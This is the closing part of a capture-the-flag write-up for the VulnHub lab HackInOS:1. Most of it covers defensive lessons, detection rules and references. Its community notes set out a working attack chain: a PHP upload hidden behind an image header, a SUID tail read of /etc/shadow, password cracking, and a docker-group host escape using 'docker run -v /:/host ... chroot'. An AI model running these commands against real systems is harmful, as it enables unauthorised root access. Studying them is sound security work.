| 6 | **Predictable "random" filename**: `md5($name . rand(1,100))` | `upload.php` | Only 100 candidates; enumerated in ~1 s |
| 7 | Uploads stored inside the document root | `/var/www/html/uploads/` | Executable by Apache |
| 8 | **SUID bit set on `tail`** | `/usr/bin/tail` (container) | Read `/etc/shadow` |
| 9 | **MD5-crypt password hashes with weak passwords** | `root:john`, `hummingbirdscyber:123456` | Cracked in seconds |
| 10 | **Credential reuse: container password = host SSH password** | port 22 | Container → host foothold |
| 11 | **Host user in the `docker` group** | `999(docker)` | **Host root** — trivially |
| 12 | Host user in the `lxd` group | `108(lxd)` | Alternative host root |
| 13 | **SUID binary calling `whoami` via `$PATH`, with a user-writable directory first in PATH** | `~/a.out` + `~/bin` | Alternative host root |
| 14 | No `gcc`/`nc` inside the container | slim image | *(Mitigating — blocks kernel exploits, so the intended path is the escape)* |

## 8. Defensive lessons (blue team)

1. **Never trust a file upload — re-encode it.** Checking MIME type is checking the
   first few bytes; checking the extension is checking a string. Neither is content
   validation. The only robust approach:
   ```php
   $img = imagecreatefromstring(file_get_contents($_FILES['file']['tmp_name']));
   if (!$img) { die('Not a valid image'); }
   $id   = bin2hex(random_bytes(16));          // CSPRNG, 128 bits of entropy
   $dest = '/var/uploads/' . $id . '.png';     // force the extension yourself
   imagepng($img, $dest);                      // re-encode: ALL metadata and trailing bytes destroyed
   imagedestroy($img);
   ```
   Store uploads **outside** the document root, serve them through a handler that
   never executes, and disable the engine in that directory:
   ```apache
   <Directory /var/uploads>
       php_flag engine off
       RemoveHandler .php .phtml .php3 .php4 .php5 .phar
       Options -ExecCGI -Indexes
   </Directory>
   ```
2. **Use an allow-list, and actually use it.** `$allowed_ext` was declared and then
   never referenced. A linter or a unit test ("uploading `x.php` must be rejected")
   would have caught this in CI. Enforce the extension *yourself*:
   ```php
   $ext = in_array(strtolower($ext), $allowed_ext, true) ? $ext : 'bin';
   ```
3. **Never use `rand()` for security.** `rand(1,100)` is 6.6 bits of entropy. Use
   `random_bytes()` / `bin2hex()` / UUIDv4. PHP's `mt_rand()` is also predictable
   (its state can be recovered from two outputs). Only `random_int()` and
   `random_bytes()` are CSPRNGs.
4. **Do not publish your vulnerable code with a link to it.** Beyond the obvious: in
   a real engagement, a leaked `.git` directory, a `SourceMap`, a `composer.json`, or
   a public repo named after the client is routinely how attackers get the source.
   Scan for it: `/.git/config`, `/.env`, `/composer.json`, `/package.json`,
   `/.well-known/`, `/wp-config.php.bak`.
5. **Never set SUID on a general-purpose tool.** `chmod u+s /usr/bin/tail` is
   equivalent to giving every local user read access to every file on the system.
   Audit continuously and diff against a baseline:
   ```bash
   find / -xdev -type f \( -perm -4000 -o -perm -2000 \) -printf '%M %u %p\n' 2>/dev/null | sort > suid.today
   diff suid.baseline suid.today
   ```
   `aide`, `osquery` (`SELECT * FROM suid_bin`) and Wazuh all do this automatically.
6. **Treat `docker` and `lxd` group membership as root.** Because it is.
   - Use **rootless Docker**: `dockerd-rootless-setuptool.sh install`. The daemon then
     runs as the user, so `-v /:/host` only exposes that user's own files.
   - Or **Podman**, which is daemonless and rootless by design with a
     Docker-compatible CLI.
   - If rootful Docker is unavoidable, front it with a **broker** exposing only an
     allow-list of subcommands via sudo — never hand out the raw socket.
   Detect exposure now:
   ```bash
   getent group docker lxd | tr ',' '\n'
   awk -F: '$4 ~ /docker|lxd/ {print $1}' /etc/group
   ls -l /var/run/docker.sock /var/snap/lxd/common/lxd/unix.socket
   ```
7. **Never let a SUID program resolve commands through `$PATH`.** Use absolute paths
   (`/usr/bin/whoami`), and clear the environment:
   ```c
   clearenv();
   execl("/usr/bin/whoami", "whoami", (char *)NULL);
   ```
   Belt and braces: sudoers' `secure_path` exists for the same reason, and
   `Defaults env_reset` wipes user-supplied variables.
8. **Hash passwords properly.** MD5-crypt (`$1$`) is obsolete. On Ubuntu 18.04+ use
   yescrypt (`$y$`) or at minimum SHA-512-crypt (`$6$`) with a high round count:
   ```text
   # /etc/login.defs
   ENCRYPT_METHOD YESCRYPT
   ```
   Then enforce a real policy — `pam_pwquality` with `minlen=14 dictcheck=1
   usercheck=1 enforce_for_root`, `pam_faillock` for lockout, and a breached-password
   screen. `john` and `123456` should be rejected at *set* time, not cracked later.
9. **Never reuse a password between a container and the host.** Containers are
   lower-trust than hosts by design; a leaked container credential must not be a
   host credential.
10. **Detection opportunities.**
    - Alert on file *creation* with a `.php` extension under an upload directory
      (auditd: `-w /var/www/html/uploads -p wa -k upload_write`), and on any file
      there whose bytes contain `<?php`.
    - Alert on `www-data` (or any service UID) reading `/etc/shadow` — auditd
      `-w /etc/shadow -p r -k shadow_read` with a `uid!=0` filter.
    - Alert on any `docker` CLI invocation whose arguments include `-v /`,
      `--privileged`, `--pid=host`, `--net=host` or `chroot`. Enable the Docker
      `audit`/`json-file` log driver and ship it.
    - Alert on `su` succeeding from a session whose parent is the web server.
    - Alert on new files appearing in a user-writable directory that precedes system
      paths in `$PATH` (the `~/bin/whoami` hijack).
    - Alert on outbound connections from a container to the host's SSH port — that
      pattern is a container escape in progress.

---

## 9. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/hackinos-1,295/>
- Series: <https://vulnhub.com/series/hackinos,201/>
- Author: Fatih Çelik · the intentionally vulnerable source:
  <https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php>
- Community writeups consulted:
  - [Hacking Articles — HackInOS:1: Vulnhub Lab Walkthrough](https://www.hackingarticles.in/hackinos1-vulnhub-lab-walkthrough/)
  - [Jon Wood / windsorwebdeveloper — HackInOS: 1 Vulnhub Walkthrough (PATH hijack)](https://windsorwebdeveloper.com/hackinos-1-vulnhub-walkthrough/)
  - [Jack Barradell-Johns — HackInOs One Writeup](https://blog.barradell-johns.com/index.php/2019-04-03/hackinos-one-writeup/)
  - [ethicalhackers.club — HackInOS Level 1 (VulnHub) Complete Walkthrough](https://ethicalhackers.club/hackinos-level-1-vulnhub-complete-walkthrough-guide/)
  - [Vuln Mafia — HackInOS: 1](https://pentestmafia.github.io/Vulnhub/writeup/hackinos1.html)
  - [leegengyu — vulnhub-box-walkthrough / hackinos-1.md](https://github.com/leegengyu/vulnhub-box-walkthrough)
- Background reading:
  - [GTFOBins — tail (SUID file read)](https://gtfobins.github.io/gtfobins/tail/#suid)
  - [GTFOBins — docker](https://gtfobins.github.io/gtfobins/docker/) · [lxd](https://gtfobins.github.io/gtfobins/lxd/)
  - [Docker rootless mode](https://docs.docker.com/engine/security/rootless/) · [Docker daemon attack surface](https://docs.docker.com/engine/security/#docker-daemon-attack-surface)
  - [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
  - [PHP `pathinfo`](https://www.php.net/manual/en/function.pathinfo.php) · [`finfo`](https://www.php.net/manual/en/class.finfo.php) · [`random_bytes`](https://www.php.net/manual/en/function.random-bytes.php) · [`rand` (why not to use it)](https://www.php.net/manual/en/function.rand.php)
  - [`ffuf`](https://github.com/ffuf/ffuf) · [`wfuzz`](https://github.com/xmendez/wfuzz) · [`gobuster`](https://github.com/OJ/gobuster)
  - [John the Ripper — crypt formats](https://www.openwall.com/john/doc/README.md)
  - [HackTricks — Bypassing image upload restrictions](https://book.hacktricks.xyz/pentesting-web/file-upload)
  - [HackTricks — Container escape / Docker breakout](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
  - [pentestmonkey — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)


### Community notes — consensus, pitfalls and alternative routes (cross-checked against the sources below):

- **Consensus chain:** `nmap -p-` → `22` + `8000` (no 80; WordPress front page rendering broken) → `/etc/hosts hackinos` or Burp Match & Replace (base URL hard-coded to `localhost:8000`) → `robots.txt` → `/upload.php` (`/uploads` → 403, no indexing) → read `upload.php` from the dev's GitHub (`fatihhcelik/Vulnerable-Machine---Hint`) → upload `GIF87a`/`GIF89a`+PHP → `ffuf`/`wfuzz`/`dirb` the 100 candidates → www-data shell → `/.dockerenv` + `/proc/1/cgroup` = container → SUID `/usr/bin/tail` → `/etc/shadow` → `root:john` → `su root` (container, fake flag, `/root/.port` hint) → `wp-config.php` creds `wordpress:wordpress`, host `db` → MySQL → table `host_ssh_cred` → unsalted MD5 `e10adc3949ba59abbe56e057f20f883e` → `john --format=raw-md5` → `hummingbirdscyber:123456` → `ssh hummingbirdscyber@TARGET` → `999(docker)` → `docker run -v /:/host --rm -it alpine chroot /host sh` → host `/root/flag`.
- **Common pitfall:** never add `TARGET localhost` — `127.0.0.1 localhost` already exists; give another hostname and drive the POST with curl/Burp, because from the browser the form posts to your own machine. (A commenter on Jon Wood's writeup who repointed `localhost` itself kept hitting `getimagesize(): Filename cannot be empty` — evidence of how much of the app assumes it.)
- **Common pitfall:** the MIME check is live and magic-byte-only, so a real image header (`GIF87a`/`GIF89a`) is required; the filename is `md5(<name>.<rand>)` with the extension lower-cased **inside** the hash. Test a `.txt` upload too — the `:)` rejection proves the check exists.
- **Common pitfall:** container root is not the goal — `su root` gives a fake flag (`Life consists of details..` in several writeups); you must pivot (`.port` → `wp-config.php` → MySQL) and then to SSH on port 22 as `hummingbirdscyber` for the `999(docker)` group.
- **⚠️ Verification note:** the SUID-`tail` read of `/etc/shadow` yields only the **root** (`john`) hash; `hummingbirdscyber:123456` comes from the **web app's database** (a plain MD5 in `host_ssh_cred`), not from `/etc/shadow`.
- **⚠️ Verification note:** writeups disagree on the shadow hash **format** — one screenshot shows `$6$` (SHA-512-crypt), other writeups mention the weaker `$1$` (MD5-crypt). John auto-detects either; do not force `--format` on that hash. The cracked value (`root:john`) is consensus. Likewise the DB container's IP varies by revision (`172.18.0.2` or `172.18.0.3`) — trust the Docker DNS name `db`.
- **Alternative routes:** an SUID-root helper `a.out` in the user's home calls `whoami` by bare name with `/home/hummingbirdscyber/bin` first in `$PATH` → PATH hijack → SUID bash (`-p`!); for the escape `docker run --rm -v /home/$USER:/h_docs ubuntu sh -c 'cp /bin/sh /h_docs/ && chmod +s /h_docs/sh'` also works; and Hacking Articles pivots **from the www-data shell** with Metasploit (`web_delivery` → `autoroute` → `ping_sweep`/`portscan` over `172.18.0.0/16`) to find the MySQL container without ever taking the `su root` detour.
- **Verified sources:** [Hacking Articles](https://www.hackingarticles.in/hackinos1-vulnhub-lab-walkthrough/) · [Jon Wood](https://windsorwebdeveloper.com/hackinos-1-vulnhub-walkthrough/) · [iProg](https://www.iprog.it/blog/sicurezza-informatica/hackinos-1-walkthrough/) · [Ethical Hackers Club](https://ethicalhackers.club/hackinos-level-1-vulnhub-complete-walkthrough-guide)

---

## 10. Screenshot checklist

- [ ] `images/01-nmap.png` — SSH on 22 and HTTP on 8000
- [ ] `images/02-source.png` — the `upload.php` source from GitHub
- [ ] `images/03-container.png` — `/.dockerenv` and the container-ID hostname
- [ ] `images/04-shell.png` — reverse shell as `www-data` inside the container
- [ ] `images/05-container-root.png` — SUID `tail` → `/etc/shadow` → `su root` → fake flag
- [ ] `images/06-root-flag.png` — `docker run -v /:/host … chroot` → host root → `/root/flag`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
